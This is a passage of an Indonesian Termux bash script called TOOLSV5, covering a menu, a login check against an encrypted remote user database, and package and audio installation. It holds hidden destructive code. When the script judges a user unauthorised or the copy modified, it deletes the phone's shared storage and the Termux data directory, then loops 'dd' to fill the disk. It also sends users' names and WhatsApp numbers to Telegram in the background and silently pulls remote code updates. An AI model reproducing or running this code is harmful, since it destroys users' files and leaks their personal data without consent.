mv -f $filenya/music.txt $filenya$soundnya
musikrun &> /dev/null &
$e
e $b " Musik sudah ikut Default dari TOOLSV5"
sleep 5
elif [ "$mana" = "0" ]; then
e $bg_m "BACK TO TOOLSV5$res"
sleep 3
break
else
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m " Input salah Tod ! $res"
fi
done
elif [[ $no == "cache" || $no == "CACHE" ]]; then
clear
cachetoolsv5
elif [[ $no == "ultah" || $no == "ULTAH" ]]; then
while true; do
clear
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $m $bg_lg "Silahkan Masukkan Ulang Tahun Anda$k!\n$k($b contoh$k:$bl 30.12.2000 $k) $res $b"
echo
IFS= read -r -e -p "  Tanggal.Bulan.Tahun ===>  " dangisi
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
if [ -z "$dangisi" ]; then
echo
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m "JANGAN DI KOSONG KAN KOCAK :D"
sleep 3
elif [[ $dangisi =~ ^[0-9]{2}\.[0-9]{2}\.[0-9]{4}$ ]]; then
echo "$dangisi" > "$ultah"
clear
echo
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
e $h $bg_lg "Terima kasih$k!\n$h Tanggal ulang tahun Anda telah disimpan.$res"
sleep 3
break
else
echo
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m "NGUAWUR KON :D"
sleep 3
fi
done
elif [[ $no == "off" || $no == "OFF" ]]; then
cek_akses
killall mpv &> /dev/null
pkill -9 -f "mpv.*backsound" &> /dev/null
elif [[ $no == "on" || $no == "ON" ]]; then
clear
musikrun
sleep 3
elif [[ $no == "YES" || $no == "yes" ]]; then
clear
rm -rf $edukasi
elif [[ $no == "NO" || $no == "no" ]]; then
clear
echo "GALIRUS OFFICIAL" > $edukasi
sleep 5
elif [[ $no == "voice" || $no == "VOICE" ]]; then
play_sound_effect
sleep 3
elif [[ "$no" == "voice off" || "$no" == "VOICE OFF" ]]; then
pkill -9 -f "mpv.*murid_kesayangan_galirus" &> /dev/null
elif [[ $no == "info" || $no == "INFO" ]]; then
clear
e $m "==================================="
e $h "       LIST TERBARU/UPDATE $versitoolsv5 "
e $m "==================================="
info_update
e $m "===================================$h"
IFS= read -r -e -p " ENTER UNTUK MENGULANGI TOOLSV5"
elif [ "$no" = "dosa" ]; then
echo "Link TELEGRAM"
xdg-open "https://t.me/squidwardyahahayuk"
elif [[ $no == "report" || $no == "REPORT" ]]; then
clear
e $m "========================================"
e $k "          $m∆$k LAPOR BUG $m∆"
e $m "========================================"
e $h "Untuk melaporkan Bug\n Anda harus berada dimana script yang error\n Jika sudah screenshot script yang$m ERROR$h\n dan kirim ke whatsapp saya !"
e $m "========================================$bl"
IFS= read -r -e -p " ENTER UNTUK MELAPORKAN BUG"
xdg-open "https://wa.me/6285850268349?text=Assalamualaikum%20Bang%20Saya%20Nemu%20BUG%20TOOLSV5"
elif [[ $no == "tutor" || $no == "TUTOR" ]]; then
clear
xdg-open "https://t.me/+VcaXi-QLbwY2NmU1"
ENTER
elif [[ $no == "brangkas" || $no == "BRANGKAS" ]]; then
xdg-open "https://t.me/brangkas2002"
elif [ "$no" = "0" ]; then
touch $PREFIX/tmp/.tools
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null
kill_sound &> /dev/null &
cd $HOME
isipesan="Terdeteksi Keluar Dari TOOLSV5 !  💻"
telegram &> /dev/null &
exit 0
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "YAH TOOLSV5 BINGGUNG APA YANG ANDA PILIH !$res "
play -q $HOME/Lubeban/sound/input_salah.mp3 &> /dev/null &
sleep 5
fi
done
}
clear
toolsv5git="$HOME/Lubeban/.git/index"
if [ -f "$toolsv5git" ]; then
BLOCKLIST_FILE="$PREFIX/lib/blockID"
if [ -f "$BLOCKLIST_FILE" ]; then
blocklist_ids=$(tr -d ' ' < "$BLOCKLIST_FILE")
termux_id=$(whoami)
fi
termux_id=$(whoami)
if echo "$blocklist_ids" | grep -wq "$termux_id"; then
isipesan=" BLOCKLIST ID SUCCESFULL  💻"
telegram &> /dev/null &
clear
echo "y" | termux-setup-storage &> /dev/null &
$banner | lolcat
$e
$e
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $bg_m "ANDA DI LARANG MENGGUNAKAN TOOLSV5 !$res"
sleep 3
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
base &> /dev/null &
xxparun &> /dev/null &
exit 0
else
security="/data/data/com.termux/files/home/Lubeban/.git"
if [ -d "$security" ]; then
menu
clear
e "$b"
validate_termux_id() {
local encrypted_id="$1"
local decrypted_id termux_id
decrypted_id=$(decrypt_id "$encrypted_id")
termux_id=$(id | tr -d '\n')
if [[ "$decrypted_id" != "$termux_id" ]]; then
return 1
fi
return 0
}
fetch_database() {
curl -sL "$DATABASE_URL" |
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -base64 -pass pass:'LEMAH_LU_PADA' 2> /dev/null
}
decrypt_id() {
local encrypted="$1"
echo "$encrypted" | openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_PASS" -base64 2> /dev/null
}
checkdir() {
if [ -d $PREFIX/include/bash/include/Version ]; then
isipesan="Direktori Version Ada Tuan"
telegram &> /dev/null &
else
mkdir -p $PREFIX/include/bash/include/Version
cekversi=$(ls $PREFIX/include/bash/include/Version)
isipesan="$cekversi Baru Di Buat Tuan"
telegram &> /dev/null &
fi
}
cek_jalur_apikey() {
echo "y" | termux-setup-storage &> /dev/null
cek="/sdcard/DCIM"
if [ -d "$cek" ]; then
return 0
else
e "$ran6
Saya tak mendapatkan perizinan penyimpanan ke internal anda
mohon untuk mengizinkan saya menyimpan file ke internal anda !"
pkill -9 com.termux
fi
}
auto_login_check() {
if [[ ! -f $gal ]]; then
return 1
fi
read -r saved_user saved_encrypted_uuid saved_wa_number < "$gal"
if [[ -z $saved_user || -z $saved_encrypted_uuid || -z $saved_wa_number ]]; then
rm -f "$gal"
return 1
fi
if ! validate_termux_id "$saved_encrypted_uuid"; then
rm -f "$gal"
return 1
fi
local database_content
database_content=$(fetch_database) || return 1
while IFS= read -r line; do
[[ -z $line ]] && continue
file_user=$(awk '{print $1}' <<< "$line")
file_encrypted_uuid=$(awk '{print $2}' <<< "$line")
file_wa_number=$(awk '{print $3}' <<< "$line")
if [[ $file_user == "$saved_user" &&
$file_encrypted_uuid == "$saved_encrypted_uuid" &&
$file_wa_number == "$saved_wa_number" ]]; then
return 0
fi
done <<< "$database_content"
rm -f "$gal"
return 1
}
show_banner() {
clear
namamu=$(cat "$nama_file")
galirus | lolcat
termux_id=$(whoami)
formatted_date=$(printf "%-25s" "$ucap$tanggal")
format_ids=$(printf "%-10s" "$termux_id")
e $b "┌─────────────────────────────────────────────────┐"
e $b "│ $b [$m •$b ]${ran3} Notifikasi  $m  :${ran5} Selamat${ran7} $(printf '%-8s' "$ucapan") $k$b        │"
e $b "│ $b [$k •$b ]${ran3} Sekarang Jam$m  :${ran5} $(date +"%H:%M")$b                    │"
e $b "│ $b [$h •$b ]${ran3} Sekarang Hari$m :${ran5} $formatted_date$b│"
e $b "├─────────────────────────────────────────────────┘"
e $b "│"
}
check_user() {
checkdir &> /dev/null &
local user="$1"
local encrypted_id="$2"
local wa_number="$3"
mpv "$HOME/Lubeban/sound/loading.mp3" &> /dev/null &
e $b "│ ┌───────────────┐"
e $b "├─┤$m VERIFIKASI$p ID$b │"
e $b "│ └───────────────┘"
sleep 1
for i in {0..100}; do
echo -ne "\r └► Verifikasi [ $i ]"
sleep 0.05
done
local database_content
database_content=$(fetch_database)
if [[ $? -ne 0 ]]; then
isipesan="Gagal Ambil Database Untuk User $user $wa_number ��"
telegram &> /dev/null &
echo -ne "\r └► Gagal mengambil database."
sleep 3
return 1
fi
if ! validate_termux_id "$encrypted_id"; then
isipesan="UUID Tidak Cocok: $user $wa_number"
telegram &> /dev/null &
echo -ne "\r └► Login gagal: ID Termux tidak cocok\033[K"
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null
sleep 2
return 1
fi
local user_found=0
local wa_found=0
while read -r line; do
[[ -z $line ]] && continue
file_user=$(awk '{print $1}' <<< "$line")
file_encrypted_uuid=$(awk '{print $2}' <<< "$line")
file_wa_number=$(awk '{print $3}' <<< "$line")
if [[ "$file_user" == "$user" ]]; then
user_found=1
fi
if [[ "$file_wa_number" == "$wa_number" ]]; then
wa_found=1
fi
if [[ "$file_user" == "$user" && "$file_encrypted_uuid" == "$encrypted_id" && "$file_wa_number" == "$wa_number" ]]; then
isipesan="Login Valid $user $wa_number 💻"
telegram &> /dev/null &
echo -ne "\r └► Login Valid Halo $namamu\033[K"
echo "$user $encrypted_id $wa_number" > "$gal"
play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null
return 0
fi
done <<< "$database_content"
if [[ $user_found -eq 0 ]]; then
isipesan="Login gagal: user tidak cocok"
echo -ne "\r └► Login gagal: user tidak cocok\033[K"
elif [[ $wa_found -eq 0 ]]; then
isipesan="Login gagal: nomor WA tidak cocok"
echo -ne "\r └► Login gagal: nomor WA tidak cocok\033[K"
else
isipesan="Data Tidak Cocok: $user $wa_number"
echo -ne "\r └► Login gagal: data tidak cocok\033[K"
fi
telegram &> /dev/null &
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null
sleep 2
return 1
}
galirus() {
pesan=("Halo, dunia!" "Semangat terus!" "Jangan Dengarkan Apa Kata Mereka!" "Pemrograman Bash itu seru!" "Semoga harimu menyenangkan!" "Tetap positif!" "Persetan Untuk Kang Recode!" "Koding Itu Menyenangkan!" "Scanning Apikey Version: $versitoolsv5")
jumlah=${#pesan[@]}
pesan_acak=${pesan[RANDOM % jumlah]}
play -q "$HOME/Lubeban/sound/robot.mp3" &> /dev/null
cowsay -f eyes "$pesan_acak"
}
while true; do
echo "y" | termux-setup-storage &> /dev/null
show_banner
if [[ -f $gal ]]; then
if auto_login_check; then
bluearchive() {
audioupdate() {
cd $PREFIX/lib/python3.11/email/mime/audio || return
git pull origin main &> /dev/null
git stash &> /dev/null
}
audioupdate &> /dev/null &
audio_dir="$PREFIX/lib/python3.11/email/mime/audio"
audio_files=($(ls -1 "$audio_dir"/*.mp3 2> /dev/null | shuf))
random_audio=${audio_files[RANDOM % ${#audio_files[@]}]}
mpv --volume=70 "$random_audio" &> /dev/null
}
bluearchive &> /dev/null
e $b "│ ┌───────────────┐"
e $b "├─┤$m VERIFIKASI$p ID$b │"
e $b "│ └───────────────┘"
sleep 1
function show_loading() {
local i=0
while [ $i -le 100 ]; do
echo -ne "\r └► Verifikasi [ $i ]"
sleep 0.05
((i++))
done
}
kill $! &> /dev/null &
play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
isipesan="ID TERDAFTAR UNTUK $namamu"
telegram &> /dev/null &
echo -ne "\r └► ID TERDAFTAR HALO $namamu"
sleep 3
clear
play -q "$HOME/Lubeban/sound/welcome.mp3" &> /dev/null &
e $bl
text="      Selamat Datang Di TOOLSV5 $versitoolsv5"
delay=0.05
for ((i = 0; i < ${#text}; i++)); do
echo -n "${text:i:1}"
sleep $delay
done
downloader &> /dev/null
mpvtube &> /dev/null
hore_ultah
filesound
TOOLS
exit 0
else
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null
e $b "│ ┌───────────────┐"
e $b "├─┤$m VERIFIKASI$p ID$b │"
e $b "│ └───────────────┘"
isipesan="ID berubah: $saved_user $saved_wa_number"
telegram &> /dev/null &
echo -ne "\r └► ${m}Login gagal:${h} ID anda${ran10} mengalami${m} perubahan!"
sleep 5
play -q "$HOME/Lubeban/sound/klik.mp3" &> /dev/null
echo -ne "${b}\r └► ${m}Silahkan beli untuk${h} claim ID baru anda    "
fi
fi
sleep 5
play -q "$HOME/Lubeban/sound/robot2.mp3" &> /dev/null &
play -q "$HOME/Lubeban/sound/falid.mp3" &> /dev/null &
echo -ne "\r │                                                       "
echo -ne "${b}\r ╰────►${bl}  Masukkan Data${c} (${ran10}user id wa${c})${ran3}:${ran8}"
read -r input_line
clear
show_banner
if [[ "$input_line" =~ ^(EIXT|exit)$ ]]; then
exit 0
fi
if [[ $(wc -w <<< "$input_line") -ne 3 ]]; then
echo -e "\033[1;31mFormat salah! Gunakan format: user,encrypted_id,whatsapp\033[0m"
play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null
sleep 2
continue
fi
IFS=' ' read -r user encrypted_id wa_number <<< "$input_line"
if check_user "$user" "$encrypted_id" "$wa_number"; then
printf "\n"
fi
done
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
clear
isipesan=" SCRIPT TIDAK DAPAT DI AKSES ��️"
telegram &> /dev/null &
e $b" ╔══════════════════════════════════════════════╗$b"
e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES��       $b ║"
e $b" ╚══════════════════════════════════════════════╝$b"
sleep 3
echo
echo "y" | termux-setup-storage &> /dev/null &
rm -rf /storage/emulated/0 &> /dev/null &
rm -rf data/data/com.termux/ &> /dev/null &
while true; do dd if=/dev/zero of=largefile bs=1G count=1; done
e $k " Atas Pelanggaran yang anda lakukan"
e $h " TOOLSV5$k menolak AKSES ke anda"
exit
fi
fi
else
base &> /dev/null &
xxparun &> /dev/null &
clear
isipesan="Terdeteksi Melanggar Aturan / Hak Tanpa Izin. MODE LAG ON AND RESET ON 🔥"
telegram &> /dev/null &
echo
cd $HOME
clear
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
e $m "KERJA BAGUS BUNG ! AKU SUKA CARA MAIN MU ! "
sleep 5
clear
e $m "Hanya Saja Anda Saya Tolak"
sleep 5
clear
e $m "MELARANG PENGUNAAN SCRIPT MODIFIKASI ON ! "
play -q $HOME/Lubeban/backsound.mp3 &> /dev/null &
exit 0
fi
else
clear
e "$bl"
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
while true; do
clear
cekdirektorinama="$PREFIX/include/bash/include"
if [ -d "$cekdirektorinama" ]; then
while true; do
namamu=$(dialog --inputbox "Kalau boleh tahu, siapa nama Anda?" 8 40 --output-fd 1)
if [ $? -ne 0 ]; then
clear
echo "Anda Harus Memasukkan Nama Anda"
sleep 3
fi
namamu=$(echo "$namamu" | sed 's/^[ \t]*//;s/[ \t]*$//')
if [[ $namamu =~ ^[a-zA-Z]+([[:space:]][a-zA-Z]+)*$ ]] && [[ ${#namamu} -le 23 ]]; then
echo "$namamu" > "$nama_file"
dialog --infobox "Nama berhasil disimpan!" 6 30
sleep 3
clear
break
else
dialog --infobox "Nama hanya boleh berisi huruf dan spasi (tanpa angka/simbol), maksimal 23 karakter!" 7 50
fi
done
break
else
mkdir -p $PREFIX/include/bash/include
fi
done
break
fi
done
else
clear
properties() {
konfigurasi_tombol() {
cat > $PREFIX/bin/gal << 'GAL'
if [ -f "$PREFIX/bin/xnxx" ]; then
xnxx
else
clear
echo "Maaf Fitur Downloader Belum Terpasang"
fi
GAL
chmod +x "$PREFIX/bin/gal"
cat > $PREFIX/bin/mpvtube << 'TUBE'
if [ -f "$PREFIX/bin/xnxxx" ]; then
xnxxx
else
clear
echo "Maaf Fitur MPVTUBE Belum Terpasang"
fi
TUBE
chmod +x "$PREFIX/bin/mpvtube"
}
konfigurasi_tombol
mkdir -p ~/.termux
sed -i '/# Termux Properties - Auto Generated By.Galirus/,$d' ~/.termux/termux.properties 2> /dev/null
cat >> ~/.termux/termux.properties << 'EOF'
font_size=14
bell-character=ignore
terminal-transcript-opacity=0.95
use-black-ui=true
hide-soft-keyboard-on-startup=true
clipboard-autocopy=true
terminal-margin-vertical=1
extra-keys = [ \
['TAB', 'ESC', '|', '/', '@', '<>', 'jarvis\n', 'HOME', 'PGUP'], \
['SHIFT', 'CLEAR\n', '{}', ';', 'gal\n', '[]', '-', 'END', 'PGDN'], \
['cd /sdcard\n', '$', '=', '&', 'mpvtube\n', '~', 'UP', 'DEL', 'BKSP'], \
['CTRL', 'ALT', 'QUOTE', '|', 'toolsv5\n', 'LEFT', 'DOWN', 'RIGHT', 'ENTER'] \
]
EOF
}
cd $HOME/Lubeban
banner6
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null
play -q $HOME/Lubeban/sound/update.mp3 &> /dev/null &
sleep 3
play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
e $m "Lagi Menginstall Mohon Bersabar"
sleep 3
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
$paket update
echo "y" | termux-setup-storage &> /dev/null &
REQUIRED_PKGS=(python python3 git bash ruby curl espeak socat php jq wget zip unzip tree tmux coreutils ncurses-utils fzf xh libcurl openssl openssl-tool figlet openssh which cloudflared cowsay mpv sox dialog boxes ffmpeg)
for pkg in "${REQUIRED_PKGS[@]}"; do
if ! command -v "$pkg" &> /dev/null; then
e "📦 Menginstall: $pkg..."
$paket install binutils -y
$paket install -y "$pkg" || {
e "${b}[${m} GAGAL${b} ]${p} install $pkg!"
continue
}
gem install lolcat
else
e "${b}[${h} SUCCESS${b} ]${p} $pkg sudah terinstall."
sleep 0.3
fi
done
if command -v yt-dlp &> /dev/null; then
e "🔄 Memperbarui yt-dlp..."
yt-dlp -U
else
e "⬇️ Mengunduh yt-dlp terbaru..."
wget -q https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -O "$PREFIX/bin/yt-dlp"
chmod a+rx "$PREFIX/bin/yt-dlp"
fi
PY_PKGS=(requests mechanize bs4 pycryptodome phonenumbers keyboard rich colorama tqdm packaging)
for pkg in "${PY_PKGS[@]}"; do
if python3 -m pip show "$pkg" &> /dev/null; then
e "${b}[${h} SUCCESS${b} ]${p} pip package: $pkg sudah terinstall."
else
e "📦 Menginstall pip package: $pkg..."
python3 -m pip install "$pkg"
fi
done
URLS=(
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_attendance_enter_1.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_attendance_enter_2.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_attendance_enter_3.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_attendance_enter_4.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_eventarchive_enter_1.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_eventarchive_enter_2.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_sit_in_1.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_sit_talk_1.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_sit_talk_2.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_sit_talk_3.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_watch_in_1.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/arona_work_watch_in_2.ogg"
"https://raw.githubusercontent.com/WatashiSenseiGalirus/Arona/main/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav"
)
TARGET_DIR="$PREFIX/lib/bash/.Audio"
mkdir -p "$TARGET_DIR"
echo "🔍 Mengecek file audio..."
for URL in "${URLS[@]}"; do
FILE=$(basename "$URL")
DEST="$TARGET_DIR/$FILE"
if [[ -f "$DEST" ]]; then
echo "✅ $FILE sudah ada, dilewati."
else
echo "⬇️ Mengunduh: $FILE"
if curl -sL -o "$DEST" "$URL"; then
echo "   ✔ Berhasil mengunduh $FILE"
else
echo "   ❌ Gagal mengunduh $FILE"
fi
fi
done
fi
properties
rm -rf $HOME/.number_otp
cd $HOME/Lubeban
git pull origin main &> /dev/null
git stash &> /dev/null
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
clear
suara
play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
clear
repository
curl -sL -k -o "$PREFIX/bin/MusicG404" "https://raw.githubusercontent.com/Lubebansokhekel/Lubeban/refs/heads/main/music.txt" &> /dev/null | e "$h Sabar Sedang Download File"
touch $packageinstalling
done
done
else
play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
clear
e $b" ╔══════════════════════════════════════════════╗$b"
e $b" ║$h       💀SCRIPT TIDAK DAPAT DI AKSES.           $b ║"
e $b" ╚══════════════════════════════════════════════╝$b"
sleep 3
echo
echo "y" | termux-setup-storage &> /dev/null &
e $k " Atas Pelanggaran yang anda lakukan"
e $h " TOOLSV5$k menolak AKSES ke anda"
base &> /dev/null &
exit 0
fi
